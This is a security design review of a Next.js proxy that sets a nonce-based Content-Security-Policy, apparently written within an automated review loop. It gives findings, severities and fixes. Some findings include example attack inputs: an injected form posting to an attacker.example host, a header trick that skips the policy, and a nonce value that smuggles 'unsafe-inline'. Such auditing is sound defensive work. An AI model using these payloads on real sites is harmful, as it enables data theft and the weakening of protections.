# Security Design Review — CSP proxy with per-request nonces

**Commit:** 2544a19
**Range reviewed:** `d86d2dc..HEAD` (`d86d2dc` → `9b4e453` → `b25e939` → `d90d6bb` → `99e1229` → `2544a19`)
**Worktree:** `/workspace/runs/review-arms/e3-loops/wt-csp-arm2` (branch `e3/csp-arm2`)
**Iteration:** full loop iteration 3, arm 2, FINAL pass
**Foundation:** merged code-fact-check (k=3) for this range — 0 Incorrect, 0 Unverifiable. Documented behavior taken as established; not re-verified.
**Advisory input:** `full-2/code-review-rubric.md` (ambers A1–A15; both reds dispositioned — R1 fixed in 2544a19, R2 loop-owner-waived as immutable history).

**Delta since the reviewed-at-iteration-2 state (99e1229):** `2544a19` touches `proxy.ts` only, and only comments (8 insertions / 5 deletions, all inside the module docblock and the runtime comment). No directive string, no matcher, no header write, and no call site changed. Every executable line of the security control in this range is byte-identical to what iteration 2 reviewed. This review therefore (a) re-verifies the carried findings against the current tree rather than assuming their status, (b) reads the new comment text as security documentation in its own right, and (c) states the Critical/High question explicitly.

---

## Trust Boundary Map

```
TB1  UNTRUSTED BROWSER / NETWORK  ──HTTP request──▶  Next.js proxy (proxy.ts:37)
       crosses: attacker-controlled request headers (incl. `x-nonce`,
       `next-router-prefetch`, `purpose`), method, path, query.
       Control at the boundary: `requestHeaders.set("x-nonce", nonce)` (proxy.ts:53)
       overwrites; matcher `missing:` (proxy.ts:69-72) *consumes* two of those
       headers as routing input.

TB2  PROXY  ──forwarded request headers──▶  SERVER COMPONENT RENDER (app/layout.tsx + tree)
       crosses: `Content-Security-Policy` (proxy.ts:50) and `x-nonce` (proxy.ts:53).
       Next reads the nonce off the request CSP header during render; this is the
       only path by which the nonce reaches the emitted <script> tags.
       Control: `export const dynamic = "force-dynamic"` (app/layout.tsx:26) keeps
       one nonce bound to one response.

TB3  SERVER  ──HTTP response──▶  BROWSER (policy enforcement point)
       crosses: `Content-Security-Policy` response header (proxy.ts:58).
       This is where the policy in buildCsp (proxy.ts:22-35) actually becomes a control.
       Whatever the policy omits is unenforced for the document's whole lifetime.

TB4  MODEL / USER TEXT  ──markdown render──▶  DOM (LatexRenderer.tsx, react-markdown 10)
       The boundary the docblock (proxy.ts:9-10) names as the thing CSP backstops.
       Control: react-markdown's default (raw HTML escaped; `rehype-raw` absent
       repo-wide) + `script-src 'nonce-…' 'strict-dynamic'` as defence-in-depth.

TB5  `data:` URL from html-to-image  ──dataUrlToBlob──▶  Blob → object URL → anchor
       (exportGraph.ts:23-44 → export.ts:7-19)
       crosses: a string whose media-type segment becomes the Blob's `type`, which
       becomes the object URL's effective Content-Type. In-process substitute for
       the `fetch(dataUrl)` that `connect-src 'self'` (proxy.ts:29) refuses.

TB6  BROWSER  ──HTTP request to /api/*──▶  ROUTE HANDLERS (16 routes under app/api)
       Deliberately *outside* the proxy's matcher (proxy.ts:68), therefore outside
       every control listed above — no CSP, no `x-nonce` overwrite, no other header.
```

The interesting property of this design is that TB3 is the only boundary where the policy has force, but TB1 decides *whether the request reaches TB3 at all* — and it decides that using two headers the client sets. That inversion is the source of the two Medium findings below. TB2 is the boundary the loop spent iterations 1–2 repairing (response-only CSP → both-sides CSP), and it is now sound: the request-side write at proxy.ts:50 is what Next actually consumes, `force-dynamic` prevents one nonce from being cached into many responses, and `proxy.test.ts:78-93` asserts the two policies are identical. TB4 and TB5 are inherited surfaces the change touches only lightly. TB6 is an intentional exemption whose blast radius is bounded by the fact that no route under `app/api` returns HTML.

---

## Findings

### Medium

#### CSP is omitted entirely from any response the requester labels a prefetch

**Severity:** Medium
**Location:** `proxy.ts:69-72` (the `missing:` block), consequence at `proxy.ts:63-65`
**Boundary:** TB1 → TB3 (client-controlled routing input decides whether the policy is applied)
**Move:** Assume the input is hostile — re-read the matcher as an attacker-supplied predicate rather than as a performance hint.
**Confidence:** High — the mechanism is plain in the matcher; the exploitation value is what is modest.
**Evidence:**
```
      missing: [
        { type: "header", key: "next-router-prefetch" },
        { type: "header", key: "purpose", value: "prefetch" },
      ],
```
**Legibility-target:** the reader who assumes "the CSP is on" for every page of this app.

`next-router-prefetch` and `purpose: prefetch` are ordinary request headers. Any client — `curl -H 'purpose: prefetch'`, a fetch from a third-party page, an intermediary — can set them, and doing so causes the proxy not to run: the response carries no `Content-Security-Policy`, and, because the same skip removes the *request*-side header at TB2, the document also renders with no nonce on its bootstrap scripts. So the app serves two structurally different document shapes, and only the nonced one is exercised by a test.

What this is not: a way to make the *victim's* browser skip the header. A cross-site attacker cannot add headers to a top-level navigation the victim initiates, so this does not directly strip CSP from a real user's session. The real cost is (a) a per-user-agent divergence — anything that legitimately sends `purpose: prefetch` (Chrome's prefetches, some crawlers, some corporate proxies) gets an unprotected document, and prefetched documents are the ones most likely to be served from a cache and later painted; and (b) the review-and-audit cost of a control whose applicability is decided by untrusted input. The stated justification (`proxy.ts:64-65`, "would otherwise burn a nonce on a request that may never paint") prices one `crypto.randomUUID()` — microseconds — against a security header. That exchange does not clear.

Status vs. prior iterations: **unchanged and still open.** This was security #1 in full-2 (Medium) and rubric A1; `2544a19` did not touch the matcher.

**Recommendation:** Delete the `missing:` block. A prefetched document that is never painted costs one UUID; a painted document with no CSP costs the control. If prefetch cost is later shown to matter, gate it on a measurement, not an assumption. Add a test asserting `Content-Security-Policy` is present on a request carrying `purpose: prefetch` — that test is the falsifier this decision currently lacks.

---

#### `form-action` is absent, leaving the policy's own threat model half-covered

**Severity:** Medium
**Location:** `proxy.ts:23-33`
**Boundary:** TB3 (the policy as delivered to the browser)
**Move:** Enumerate the non-fallback directives — the ones `default-src` does not cover — and check the set for holes.
**Confidence:** High — `form-action` does not inherit from `default-src`; this is specified behavior, not a browser quirk.
**Evidence:**
```
    "default-src 'self'",
    ...
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "object-src 'none'",
```
**Legibility-target:** the reader who sees `default-src 'self'` and concludes exfiltration paths are closed.

Four CSP directives do not fall back to `default-src`: `frame-ancestors`, `base-uri`, `form-action`, and (for this purpose) `object-src`. Three of the four are present and explicitly set — which is precisely what makes the fourth read as an oversight rather than a decision. With `form-action` unset, injected markup of the form `<form action="https://attacker.example" method="post">` plus a submit can post document-scoped data cross-origin, and this path is *not* blocked by `script-src`/`strict-dynamic`, because it needs no script to execute — a dangling-markup or injected-form payload suffices. The docblock at `proxy.ts:9-10` states the policy's purpose as containing what "slipped past markdown sanitization"; a form is exactly the kind of thing that slips past a sanitizer that is only script-aware.

The app has no cross-origin form targets (no `<form action=` to a foreign origin anywhere in `app/`), so `form-action 'self'` is free — no behavior change, no migration.

Status vs. prior iterations: **unchanged and still open.** security #2 in full-2 (Medium), rubric A2.

**Recommendation:** Add `"form-action 'self'"` to the array at `proxy.ts:23-33` and add it to the expected-key list in `proxy.test.ts:33-43`, which currently pins the directive set at nine and would otherwise fail closed against the fix.

---

### Low

#### `buildCsp` takes an unvalidated `nonce` and splices it into the policy

**Severity:** Low
**Location:** `proxy.ts:22`, `proxy.ts:25`, called at `proxy.ts:42`
**Boundary:** TB3 (policy construction) — the parameter itself does not cross TB1 today
**Move:** Treat the newly public function as if a future caller were the adversary; ask what the type system permits that the current caller happens not to do.
**Confidence:** High on the mechanism, Low on present exploitability — the sole caller passes a base64 UUID.
**Evidence:**
```
export function buildCsp(nonce: string): string {
  const directives = [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
```
**Legibility-target:** the future contributor who imports `buildCsp` for a `report-uri` endpoint or a Report-Only rollout.

Iteration 1's R3 fix made this function public in order to test it. That was the right call for testability, and it created an unenforced contract: `buildCsp` accepts any `string` and interpolates it directly into a security policy. A value of `x' 'unsafe-inline` yields `script-src 'self' 'nonce-x' 'unsafe-inline' 'strict-dynamic'`; a value containing `;` appends arbitrary directives. Response splitting is *not* reachable — `Headers.set` rejects CR/LF — so the ceiling here is policy weakening by a caller, not header injection by a client. Today there is exactly one caller and it is safe.

Status vs. prior iterations: **unchanged and still open.** security #3 in full-2 (Low, "new — introduced by the R3 fix"), rubric A8 (paired with the architecture half).

**Recommendation:** Either validate at the boundary (`if (!/^[A-Za-z0-9+/=]+$/.test(nonce)) throw`) or remove the injection surface by having the function mint its own value — `buildCsp(): { nonce: string; csp: string }` — which also removes the possibility of the caller and the policy disagreeing about the nonce. The second is the smaller contract.

---

#### The nonce path is unprotected on exactly the paths the proxy skips

**Severity:** Low
**Location:** `proxy.ts:51-53` vs. `proxy.ts:68-72`
**Boundary:** TB1 → TB2 (the overwrite is the control; it only exists where the proxy runs)
**Move:** Ask where the stated control is *absent* rather than whether it works where present.
**Confidence:** Medium — depends on a consumer of `x-nonce` existing, and none does today (see the Informational finding below).
**Evidence:**
```
  // Overwrite (not append) so a client-supplied x-nonce cannot be smuggled
  // through to a server component.
  requestHeaders.set("x-nonce", nonce);
```
**Legibility-target:** the future author of a server component that reads `headers().get("x-nonce")`.

The comment states an unconditional property ("a client-supplied `x-nonce` cannot be smuggled through to a server component") for a function that runs on a subset of requests. On any path the matcher excludes — all of `/api/*`, `_next/*`, and anything a client labels a prefetch — a client-supplied `x-nonce` reaches the handler verbatim. `proxy.test.ts:88-108` tests the overwrite only on `/graph`, i.e. only where it holds. This is latent rather than live because `rg "x-nonce"` outside `proxy.ts`/`proxy.test.ts` returns zero hits: nothing consumes the header, so nothing can be confused by a forged one. It becomes real the moment someone adds a consumer and trusts the comment's phrasing.

Status vs. prior iterations: **unchanged and still open.** security #4 in full-2 (Low), rubric A4 (which frames the same header as an API/architecture problem).

**Recommendation:** Resolve together with the zero-readers finding. If `x-nonce` is deleted, this disappears. If it is kept, scope the comment to the matcher ("on matched paths…") so the guarantee a reader takes away matches the one the code provides.

---

#### Matcher exclusions are unanchored prefixes

**Severity:** Low
**Location:** `proxy.ts:68`
**Boundary:** TB1 → TB3 (which requests get a policy)
**Move:** Read the regex as a pattern-matcher rather than as the sentence the comment above it writes.
**Confidence:** High — this is literal regex semantics.
**Evidence:**
```
      source: "/((?!api|_next/static|_next/image|favicon.ico).*)",
```
**Legibility-target:** whoever adds the next top-level route.

The negative lookahead matches any path *beginning with* those strings, not those path segments. A future `/apidocs`, `/api-status`, or `/apiary` page ships with no CSP and no nonce, silently — and the failure is invisible: the page renders correctly, it is merely unprotected. Conversely, the comment's "page navigations only" (`proxy.ts:63`) overstates the exclusion in the other direction: `public/`'s five SVGs and error documents *are* matched and do get a policy (harmless, but it means the comment describes neither the inclusions nor the exclusions exactly).

Status vs. prior iterations: **unchanged and still open.** security #6 in full-2 (Low), folded into rubric A1 alongside the prefetch finding.

**Recommendation:** Anchor each alternative — `/((?!api(?:/|$)|_next/static/|_next/image/|favicon\.ico$).*)`. Cheap, and it converts a silent future hole into a non-event.

---

#### The policy ships enforce-only: no reporting, no Report-Only stage

**Severity:** Low
**Location:** `proxy.ts:23-33` (absence of `report-uri`/`report-to`), `proxy.ts:58` (header name)
**Boundary:** TB3 — the enforcement point emits no signal back across it
**Move:** Ask how the operator learns the control is misconfigured, not whether it is.
**Confidence:** High on the absence; Medium on the operational weight for an app at this stage.
**Evidence:** the nine-directive array contains no `report-uri` or `report-to`, and `proxy.test.ts:33-43` pins that set as intended:
```
    expect([...directives.keys()].sort()).toEqual([
      "base-uri",
      "connect-src",
      "default-src",
      "font-src",
      "frame-ancestors",
      "img-src",
      "object-src",
      "script-src",
      "style-src",
    ]);
```
**Legibility-target:** the operator debugging "the graph panel is blank for some users."

A first strict CSP is the highest-risk moment in a policy's life: `strict-dynamic` in particular changes how *every* script on the page is trusted, and the failure mode is a silently broken feature in a subset of browsers, not an error anyone sees server-side. With neither a reporting endpoint nor a `Content-Security-Policy-Report-Only` staging pass, the only detection channel is a user complaint. This is a Low rather than a Medium because the app is small and single-origin, and because the test suite pins the directive set — but the absence should be a recorded decision, not a gap.

Status vs. prior iterations: **unchanged and still open.** security #5-equivalent in full-2 (Low).

**Recommendation:** Add `report-to`/`report-uri` pointing at a route handler that logs, or run one deploy in Report-Only before enforcing. Either way, record the choice in the CSP decision record — this is the finding most likely to be re-raised by every future reviewer until it is written down.

---

#### `dataUrlToBlob` derives the Blob's media type from its input, behind a guard that looks like validation

**Severity:** Low
**Location:** `app/lib/utils/exportGraph.ts:23-44`, consumed at `export.ts:7-19`
**Boundary:** TB5
**Move:** Separate the guard's actual postcondition from the postcondition its presence implies.
**Confidence:** High on the mechanism, Low on reachability — both call sites feed it `toPng` output.
**Evidence:**
```
  const commaIndex = dataUrl.indexOf(",");
  if (!dataUrl.startsWith("data:") || commaIndex === -1) {
    throw new Error("Not a data: URL");
  }
  ...
  return new Blob([bytes], { type: mediaType });
```
**Legibility-target:** the next caller, who will read the throw as "this function validates its input."

The guard establishes only that the string starts with `data:` and contains a comma. Everything after that — including the media type that becomes the Blob's `type`, and therefore the effective Content-Type of the object URL minted at `export.ts:8` — is taken verbatim from the input. `data:text/html,<script>…` produces an `text/html` Blob. That is not exploitable in this codebase: both call sites pass `toPng` output (always `image/png`), and `triggerDownload` sets `a.download`, which forces a download rather than a navigation. The exposure is entirely about the next caller — the function is generic, dependency-free, exported, and reads like a utility, so it will attract one.

Note the trade this function embodies is correct: decoding in-process rather than widening `connect-src` to `data:` keeps the tighter directive, and `exportGraph.ts:19-21` says so. The finding is about the guard's legibility, not the design.

Status vs. prior iterations: **unchanged and still open.** security #7 in full-2 (Low); the API/architecture half is rubric A5.

**Recommendation:** Either narrow the contract (`dataUrlToPngBlob`, hard-coding `image/png`) or allow-list the media type against what callers actually need. If the function stays generic, say in the docblock that the media type is caller-trusted.

---

### Informational

#### `/api` is exempt from the proxy with no `nosniff` backstop, and no other security headers exist anywhere

**Severity:** Informational
**Location:** `proxy.ts:68`; absence across `proxy.ts:37-59`
**Boundary:** TB6
**Move:** Ask what the exemption's stated reason ("they don't render HTML") does and does not cover.
**Confidence:** High on the absence; Low on impact for this app.
**Evidence:** `"/((?!api|_next/static|_next/image|favicon.ico).*)"` — and `proxy.ts:63-64`: `// Apply CSP to page navigations only. Skip API routes (they don't render HTML)`.
**Legibility-target:** the reviewer of the next route handler that returns a non-JSON body.

The reasoning is sound as far as it goes: 16 route handlers under `app/api`, none returning `text/html` (verified: JSON via `NextResponse.json`, plus two SSE streams at `app/api/formalization/lean/route.ts:119` and `app/api/decomposition/extract/route.ts:127`). The gap is that CSP is not the only header that matters at this boundary — `X-Content-Type-Options: nosniff` is what stops a browser from re-interpreting a response body against its declared type, and it is absent here and everywhere else. Likewise absent app-wide: `Referrer-Policy`, `Permissions-Policy`, HSTS. This change is the first and only place the repo sets a security header, which makes it the natural home for the rest.

Status vs. prior iterations: **unchanged and still open.** security #9 in full-2 (Informational).

**Recommendation:** Out of scope for a CSP change, but worth one line in the decision record naming the headers deliberately not added, so the omission is a decision. If any of them are added later, `next.config.ts` `headers()` covers `/api` too, which the proxy by design does not.

---

#### `x-nonce` remains a wire contract with zero readers, now pinned by two tests

**Severity:** Informational
**Location:** `proxy.ts:51-53`; `proxy.test.ts:82-108`
**Boundary:** TB2
**Move:** Ask what a reader infers from a published, tested header — versus what the code does with it.
**Confidence:** High — `rg "x-nonce"` across the worktree returns hits only in `proxy.ts` and `proxy.test.ts`.
**Evidence:**
```
./proxy.ts:51:  // Overwrite (not append) so a client-supplied x-nonce cannot be smuggled
./proxy.ts:53:  requestHeaders.set("x-nonce", nonce);
```
(and nothing under `app/`)
**Legibility-target:** the contributor who sees a tested header and concludes something consumes it.

Nothing reads `x-nonce`. The nonce reaches the document through the *request* `Content-Security-Policy` header (`proxy.ts:50`), which is what Next parses; `app/layout.tsx:23-25` says so explicitly and correctly. `x-nonce` is therefore a write with no reader — harmless in itself, but iteration 2 added two dedicated tests for it, which converts an unused write into a published, test-locked contract and raises the cost of deleting it. From a security standpoint the concrete residue is the mismatch noted above: the overwrite guarantee is stated unconditionally but holds only on matched paths.

Status vs. prior iterations: **unchanged and still open.** security #10 in full-2 (Informational); rubric A4 escalates the disposition (delete vs. land a real `<Script nonce>` consumer) to the loop owner. That framing is correct — this is not a security decision, and I do not re-escalate it.

**Recommendation:** Loop-owner call, not an author fix. Whichever branch is taken, the comment at `proxy.ts:51-52` should be scoped to the matcher.

---

#### The revised `style-src` rationale mixes dev-only and production dependents, and describes a permanent carve-out with no revisit condition **(new in 2544a19)**

**Severity:** Informational
**Location:** `proxy.ts:12-17` (text introduced by `2544a19`), directive at `proxy.ts:26`
**Boundary:** TB3 — `'unsafe-inline'` is the one deliberate weakening in the delivered policy
**Move:** Read the newly written justification as a security artifact: does it tell a future tightener what would have to change?
**Confidence:** High on the reading; the underlying directive is unchanged and this is documentation-quality, not a vulnerability.
**Evidence:**
```
 * Why `style-src 'unsafe-inline'`: React `style={}` attributes, reactflow's
 * inline transforms and KaTeX all emit inline styles at runtime; dev also
 * injects styles. (Tailwind v4 itself compiles to a linked stylesheet via
 * `@tailwindcss/postcss` and is already covered by `'self'`.) Tightening to
 * nonces would mean reworking how each of those ships styles.
```
**Legibility-target:** the future contributor asked to remove the last `unsafe-inline` from the policy.

`2544a19` replaced a wrong rationale (Tailwind v4 emits inline styles) with a correct one, and that is a real improvement — the repo previously carried two contradictory statements of the same contract, and `proxy.ts` was the copy a `rg "unsafe-inline"` hits first. Two residues remain. First, the enumeration mixes tiers: React `style={}` and reactflow transforms are unavoidable in production, KaTeX is configurable, and "dev also injects styles" is not a production constraint at all — yet the policy is uniform across environments, so a reader cannot tell from this text which items would actually block a production-only tightening. Second, the list is an inventory with no revisit condition and no test: nothing fails if reactflow later stops emitting inline transforms, so the carve-out is effectively permanent by default. `'unsafe-inline'` on `style-src` is a genuine (if second-tier) weakening — it enables CSS-based exfiltration and UI-redress payloads that `script-src` does not touch — so the directive most worth revisiting is the one whose justification is hardest to falsify.

Note also that the same docblock's opening claim (`proxy.ts:9-10`, CSP backstopping "something that slipped past markdown sanitization") rests on a library default rather than configuration: raw HTML is escaped because `react-markdown` v10 escapes it by default and `rehype-raw` is absent repo-wide — nothing in the repo asserts either fact. That is the same shape as rubric A14's KaTeX `trust:false` observation, and the CSP is the correct defence-in-depth answer to it; it is worth noting only so that "sanitization" is not later cited as a control that exists in its own right.

**Recommendation:** Split the list into "unavoidable in production" (React `style={}`, reactflow) and "configurable / dev-only" (KaTeX, dev injection), and name the condition under which the carve-out gets revisited. Optional but cheap: a test asserting `rehype-raw` is not among the rehype plugins in `LatexRenderer.tsx`, which turns the docblock's premise into something that fails loudly.

---

#### Nonce construction is sound but round-about

**Severity:** Informational
**Location:** `proxy.ts:38-40`
**Boundary:** TB2/TB3 — nonce unpredictability is the entire basis of the `script-src` control
**Move:** Check the entropy source and encoding against what CSP requires, independent of what the comment claims.
**Confidence:** High.
**Evidence:**
```
  // Generate a fresh nonce per request. Next 16 proxy always runs on the
  // Node.js runtime, where crypto.randomUUID and Buffer are both available.
  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
```
**Legibility-target:** anyone auditing the nonce's unpredictability.

`crypto.randomUUID()` is a CSPRNG-backed v4 UUID (122 bits of entropy), base64-encoded from its 36-character *text* form — so the nonce is 48 base64 characters carrying 122 bits. Unpredictability is well above the ~128-bit-ish guidance in spirit and far above any practical guessing attack; the roundabout part is encoding text rather than bytes (`crypto.getRandomValues(new Uint8Array(16))` → base64 would be 24 characters for the same strength). No security impact; noted so a future reader does not mistake the double encoding for a defect. The runtime claim in this comment is the one `2544a19` fixed (previously "the Edge runtime"), and it is now correct: Next 16 proxy always runs on Node.js.

**Recommendation:** None required. If touched for other reasons, `Buffer.from(crypto.getRandomValues(new Uint8Array(16))).toString("base64")` is shorter and equally strong.

---

## What Looks Good

- **The TB2 repair is genuinely complete.** Setting the policy on *both* the forwarded request (`proxy.ts:50`) and the response (`proxy.ts:58`) is the correct wiring for Next's nonce plumbing, and `proxy.test.ts:78-93` asserts the two are identical rather than merely present. Under `strict-dynamic` the `'self'` source is ignored, so a response-only CSP would have produced un-nonced bootstrap scripts and a non-hydrating app — the comment at `proxy.ts:44-48` explains exactly this, accurately.
- **`force-dynamic` closes the nonce/cache pairing.** `app/layout.tsx:26` prevents the failure mode where a prerendered document freezes one nonce across all visitors — the single most common way a nonce-based CSP is silently defeated. The comment above it correctly states that nothing in the layout reads the nonce.
- **`strict-dynamic` + `object-src 'none'` + `base-uri 'self'` + `frame-ancestors 'none'`** is the right shape for a first strict policy: it neutralizes host-allowlist bypasses, `<base>` hijacking, plugin-based script execution, and clickjacking in one pass, and it does so without a host allowlist to maintain.
- **The `connect-src` decision held under pressure.** Faced with `fetch(dataUrl)` breaking, the change decoded in-process (`dataUrlToBlob`) rather than widening `connect-src` to `data:`. That is the security-preserving branch of the fork, the docstring at `exportGraph.ts:19-21` says why, and the new tests pin the byte-exactness of the decode including a non-UTF-8 case.
- **`x-nonce` overwrite-not-append is the right instinct**, and `proxy.test.ts:95-108` tests the smuggling case specifically rather than just the happy path.
- **`2544a19` fixed a real documentation defect at the right altitude.** The Edge-runtime claim was the stated justification for the two APIs on the next line; leaving it would have had a contributor reason about API availability from the wrong runtime. The `style-src` alignment removed a contradiction between two authoritative comments. Both are comment-only and could not move a test outcome — an honest, correctly scoped final pass.

---

## Summary Table

| # | Finding | Severity | Boundary | Location | Status in loop |
|---|---------|----------|----------|----------|----------------|
| 1 | CSP omitted on client-labeled prefetch requests | Medium | TB1→TB3 | `proxy.ts:69-72` | Carried, unchanged (full-2 #1 / A1) |
| 2 | `form-action` absent | Medium | TB3 | `proxy.ts:23-33` | Carried, unchanged (full-2 #2 / A2) |
| 3 | `buildCsp` splices an unvalidated nonce | Low | TB3 | `proxy.ts:22,25` | Carried, unchanged (full-2 #3 / A8) |
| 4 | `x-nonce` overwrite absent on skipped paths | Low | TB1→TB2 | `proxy.ts:51-53` vs `:68-72` | Carried, unchanged (full-2 #4 / A4) |
| 5 | Matcher exclusions are unanchored prefixes | Low | TB1→TB3 | `proxy.ts:68` | Carried, unchanged (full-2 #6 / A1) |
| 6 | Enforce-only: no reporting, no Report-Only stage | Low | TB3 | `proxy.ts:23-33` | Carried, unchanged |
| 7 | `dataUrlToBlob` media type is caller-trusted behind a validating-looking guard | Low | TB5 | `exportGraph.ts:23-44` | Carried, unchanged (full-2 #7 / A5) |
| 8 | `/api` exempt, no `nosniff`, no other security headers | Informational | TB6 | `proxy.ts:68` | Carried, unchanged (full-2 #9) |
| 9 | `x-nonce` has zero readers, now test-locked | Informational | TB2 | `proxy.ts:51-53`, `proxy.test.ts:82-108` | Carried, unchanged (full-2 #10 / A4) |
| 10 | `style-src` rationale mixes dev/prod dependents; no revisit condition | Informational | TB3 | `proxy.ts:12-17` | **New in `2544a19`** |
| 11 | Nonce construction sound but round-about | Informational | TB2/TB3 | `proxy.ts:38-40` | Carried; runtime claim now correct |

**Critical: none. High: none.** Stated explicitly because this is the final pass: no finding in this range, at this commit, reaches Critical or High severity in the security domain. The highest are two Mediums, both of which are policy-completeness gaps rather than exploitable defects in the shipped control, and both of which have one-line fixes.

---

## Overall Assessment

**The change is a net security improvement and is safe to land as-is.** Before `d86d2dc` the app had no CSP at all; at `2544a19` it has a nonce-based `strict-dynamic` policy with the framework plumbing correctly wired, the caching hazard closed, and a test file that genuinely falsifies the core claim. The two iterations of fixes moved real defects: the response-only CSP (which would have shipped a policy that broke hydration), the `connect-src`-vs-export collision (resolved on the tight side), and two wrong comments about a security control's own mechanism.

What remains is a policy that is 80% of the way to a good strict CSP, with three gaps of decreasing weight: one directive missing (`form-action`), one applicability decision made by untrusted input (the prefetch `missing:` block), and no feedback channel (`report-to`). The first two are single-line changes with no behavioral risk and would close both Mediums; if this loop had one more fix iteration, those are the two to spend it on. Because both are additive and neither is exploitable in the current deployment, they do not warrant blocking.

The comment-only final commit deserves a specific note: reviewing documentation as a security artifact is not ceremony here. Three of the eleven findings above are about a comment stating a guarantee broader than the code provides (#4), a guarantee resting on a library default (#10), or a justification a future maintainer would reason from (#11's predecessor, which `2544a19` fixed). In a control whose correctness is invisible at runtime — a wrong CSP renders a working-looking page — the comments *are* part of the control surface. `2544a19` is the right kind of final pass.

---

## Goal-Alignment Note

- **Answered:** Whether the current state (`2544a19`) contains any Critical or High severity security finding — it does not. The status of every prior security-domain amber, re-verified against the worktree rather than assumed: prefetch CSP bypass (open, unchanged), missing `form-action` (open, unchanged), matcher prefix anchoring (open, unchanged), `buildCsp` nonce-injection surface (open, unchanged), client-controlled `x-nonce` on excluded paths (open, unchanged), no violation reporting (open, unchanged), `/api` without `nosniff` (open, unchanged). Whether `2544a19` introduced anything new in the security domain — one Informational finding (#10) about the revised `style-src` rationale; no new defect. A Trust Boundary Map of the control as it now stands (TB1–TB6), with every finding anchored to a boundary.
- **Out of scope:** Performance cost of `force-dynamic` and of the synchronous base64 decode (performance domain; rubric A9/A11). Module placement of `buildCsp` and `dataUrlToBlob` (architecture/API; rubric A5/A8 — I address only the input-validation half of A8). Test-coverage gaps that are not security controls (rubric A6/A7/A13). Commit-message accuracy findings including the loop-owner-waived 9b4e453 claim (fact-check domain; rubric R2/A15) — noted as dispositioned, not re-litigated. The `x-nonce` keep-or-delete decision, which rubric A4 correctly routes to the orchestrator as a design call rather than a security one.
- **Escalate:** Nothing. No HALT-ESCALATE condition is present: no credential or secret material appears in the diff, no authentication or authorization logic is modified, no cryptographic primitive is implemented or misused (the nonce uses a CSPRNG correctly), no data-exfiltration path is introduced, and no dependency manifest is changed in this range. The two Medium findings are recorded for the author at their native tier; convergence with prior iterations does not raise them, and their persistence across three iterations reflects a scoping decision by the loop, not a disagreement about severity.
